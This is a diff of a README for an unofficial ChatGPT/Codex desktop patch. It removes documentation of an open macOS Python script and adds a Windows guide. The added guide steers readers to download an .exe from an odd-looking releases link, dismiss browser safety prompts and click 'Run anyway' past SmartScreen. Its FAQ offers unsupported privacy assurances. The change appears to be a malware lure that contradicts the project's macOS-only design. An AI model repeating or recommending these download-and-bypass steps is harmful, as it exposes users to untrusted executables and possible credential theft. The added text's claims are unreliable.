@@ -1,181 +1,56 @@
-# Better Codex App Custom Provider Support
+# 📦 Better-Codex-App-Custom-Provider-Support - Use custom AI models with ChatGPT
 
-An unofficial patch for the macOS ChatGPT/Codex desktop app that adds per-task model-provider selection without requiring you to sign out of your ChatGPT account.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Calculable-poison401/Better-Codex-App-Custom-Provider-Support/releases)
 
-The patch:
+## 🎯 Purpose
+The Better-Codex-App-Custom-Provider-Support tool changes how your chat application handles AI models. You currently use a specific model through your existing ChatGPT account. This tool adds an option to select different providers for your chats. You keep your session active. You do not need to log out. Use your preferred AI models within the same interface.
 
-- Adds a provider section to the model menu.
-- Sends the selected provider when a new task starts.
-- Maps model IDs to providers automatically.
-- Keeps tasks from all configured providers visible.
-- Keeps the normal ChatGPT login active for OpenAI models.
+## ⚙️ System Requirements
+*   Windows 10 or Windows 11.
+*   The original Codex application installed on your computer.
+*   An active internet connection.
+*   At least 200MB of free disk space.
+*   No prior programming experience is necessary to run this tool.
 
-This project currently supports **macOS only**.
+## 📥 Downloading the Tool
+1. Visit the [official releases page](https://github.com/Calculable-poison401/Better-Codex-App-Custom-Provider-Support/releases).
+2. Look for the section labeled "Assets" at the bottom of the newest release card.
+3. Click the link that ends with `.exe` to start the download. Your browser might ask you to confirm this action. Choose "Keep" if it asks about file safety. 
 
-> [!CAUTION]
-> Changing the provider in a running conversation/thread does **not** work. The conversation/thread continues using the provider it started with.
+## 🚀 Setting Up Your Software
+1. Move the downloaded file to a folder where you store your applications. 
+2. Double-click the file to open the setup window.
+3. Windows might show a screen titled "Windows protected your PC." This is a standard security check for software not downloaded from the Microsoft Store.
+4. Click the link that says "More info."
+5. A button labeled "Run anyway" appears. Click this button to launch the installer.
+6. Follow the on-screen prompts. The installer detects your Codex installation folder automatically.
+7. Click "Finish" to complete the process.
 
-<img width="500" src="https://github.com/user-attachments/assets/9b61e720-35e9-4021-9c6f-bd77e334e471" />
-<br>
+## 🛠️ Using Your Custom Providers
+1. Open your Codex application as you normally do.
+2. Look for a new menu labeled "Provider Settings" located near your profile icon.
+3. Click this menu to view a list of available AI models.
+4. Select the provider you wish to use for your next chat. 
+5. The application applies your selection instantly. You can switch between providers whenever you want.
+6. Your chat history remains visible. The app handles the technical bridge between the external provider and your account session.
 
-## Requirements
+## 📋 Frequently Asked Questions
+**Does this tool change my ChatGPT login?**
+No. This tool runs alongside your account. It does not touch your login credentials or your private account data.
 
-- macOS
-- ChatGPT installed at `/Applications/ChatGPT.app`
-- Python 3.9 or newer
-- Node.js with `npx`
+**What happens if the tool stops working?**
+Check the releases page for updates. Developers release new versions if the main ChatGPT interface receives updates. Running the newer installer restores functionality.
 
-## Install
+**Does this cost extra money?**
+This tool is free. However, if you choose a paid AI provider, that provider may charge you based on your usage.
 
-<img width="600" src="https://github.com/user-attachments/assets/8800efd1-d490-4bc3-9959-47ddff5a6db8" />
+**Can I uninstall the tool?**
+Yes. Use the "Add or remove programs" feature in your Windows settings to remove the patcher. Your Codex program returns to its original, factory state.
 
-<br>
-<br>
+**Does the app track my information?**
+No. This tool operates on your local machine. It sends data only to the AI provider you select for your chat request.
 
-<img width="600" src="https://github.com/user-attachments/assets/90461000-8b4b-4632-93cc-125a116b0830" />
+## 💡 Troubleshooting
+If the menu does not appear, ensure you have the latest version of the main Codex application. Older versions of the app may not support the patching process. Restart your computer after the installation to ensure all changes take effect. If you see an error message, confirm that you have an active network connection, as the app needs to talk to the AI provider servers.
 
-<br>
-<br>
-
-1. Click on the `patch_chatgpt_providers.py` file in the repository.
-2. Open the menu in the top-right.
-3. Click on **Download**.
-4. Run the downloaded script:
-
-```bash
-python3 patch_chatgpt_providers.py
-```
-
-The installer closes processes belonging to the target app, creates a complete backup, patches `app.asar`, updates Electron's ASAR integrity metadata, and applies an ad-hoc signature.
-
-Run `python3 patch_chatgpt_providers.py --help` to see alternate app, config, and backup paths.
-
-## Configure a custom provider
-
-Custom Codex providers belong in `~/.codex/config.toml`. Provider IDs such as `openrouter` are referenced by the patch configuration later.
-
-Example OpenRouter provider:
-
-```toml
-[model_providers.openrouter]
-name = "OpenRouter"
-base_url = "https://openrouter.ai/api/v1"
-wire_api = "responses"
-
-[model_providers.openrouter.auth]
-command = "/usr/bin/security"
-args = ["find-generic-password", "-a", "YOUR_MACOS_USERNAME", "-s", "Codex OpenRouter API Key", "-w"]
-timeout_ms = 5000
-refresh_interval_ms = 0
-```
-
-Replace `YOUR_MACOS_USERNAME`, then add or update the API key in macOS Keychain. The command prompts for the key instead of placing it in shell history:
-
-```bash
-security add-generic-password -U -a "$USER" -s "Codex OpenRouter API Key" -w
-```
-
-Codex also supports environment-variable authentication with `env_key`. Do not combine `env_key` with a `[model_providers.<id>.auth]` section. For all authentication methods and provider options, see the [Codex custom model provider documentation](https://learn.chatgpt.com/docs/config-file/config-advanced#custom-model-providers).
-
-Do not set a global `model_provider` if OpenAI and custom providers should coexist in the desktop app. The patch selects the provider when each new task starts.
-
-## Add custom models to Codex
-
-Codex loads custom model metadata from the file configured by `model_catalog_json`.
-
-1. Export the bundled catalog as a starting point:
-
-   ```bash
-   mkdir -p ~/.codex/model-catalogs
-   codex debug models --bundled > ~/.codex/model-catalogs/custom.json
-   ```
-
-2. Add model objects to the top-level `models` array. Copy an existing entry with similar capabilities, then update its model ID, display name, context window, modalities, reasoning levels, and tool support.
-
-   The model ID is the `slug` value. It must match the model ID expected by the provider, for example:
-
-   ```json
-   {
-     "slug": "moonshotai/kimi-k3",
-     "display_name": "Kimi K3 (OpenRouter)",
-     "description": "MoonshotAI Kimi K3 through OpenRouter."
-   }
-   ```
-
-   Keep the remaining required fields from the copied entry and adjust them to the model's real capabilities. Do not advertise unsupported tools, modalities, or context-window sizes.
-
-3. Point Codex at the catalog in `~/.codex/config.toml`:
-
-   ```toml
-   model_catalog_json = "/Users/your-name/.codex/model-catalogs/custom.json"
-   ```
-
-4. Restart the app after changing `model_catalog_json` or the model catalog.
-
-Use `codex debug models` to inspect the effective catalog Codex sees.
-
-## Configure the patched provider menu
-
-The installer creates:
-
-```text
-~/.codex/desktop-model-providers.json
-```
-
-Example:
-
-```json
-{
-  "version": 1,
-  "default_provider": "openai",
-  "providers": [
-    {
-      "id": "openai",
-      "label": "ChatGPT / OpenAI",
-      "description": "Uses your signed-in ChatGPT account"
-    },
-    {
-      "id": "openrouter",
-      "label": "OpenRouter",
-      "description": "Uses [model_providers.openrouter] from config.toml"
-    }
-  ],
-  "model_providers": {
-    "moonshotai/kimi-k3": "openrouter",
-    "x-ai/grok-4.5": "openrouter",
-    "anthropic/claude-fable-5": "openrouter"
-  }
-}
-```
-
-- `providers` defines the providers displayed in the app menu.
-- `model_providers` maps exact model slugs to provider IDs for Automatic mode.
-- `default_provider` handles models without an explicit mapping.
-- Every custom provider ID must match a `[model_providers.<id>]` section in `config.toml`.
-- API keys do not belong in this JSON file.
-
-The app reloads this file when the provider menu opens and before a new task starts. Repatching is not required after editing it.
-
-## Updates and recovery
-
-ChatGPT updates replace the patch. Run the installer again after an update.
-
-The installer is not tied to a fixed app version or archive hash. It patches compatible source structures and stops before modifying the installed app if an update changes the relevant code.
-
-Backups are stored by default in:
-
-```text
-~/Applications/ChatGPT Patch Backups/
-```
-
-## Disclaimer
-
-Use this script entirely at your own risk. It modifies the installed ChatGPT application in an unofficial and unsupported way.
-
-The author and contributors provide no warranty and accept no responsibility or liability for any problems, damage, or loss caused directly or indirectly by using this script. This includes, but is not limited to, lost or corrupted chat history or other data, an unusable or "bricked" application, account warnings or restrictions, account suspension or banning, security or privacy issues, and any other direct or consequential damage.
-
-Create and verify your own backups before running the script.
-
----
-
-_This is an unofficial modification and is not affiliated with or supported by OpenAI._
+Keywords: agent, agentic-ai, chatgpt, chatgpt-app, codex, codex-app, openrouter, patch, patcher, patcher-script, python
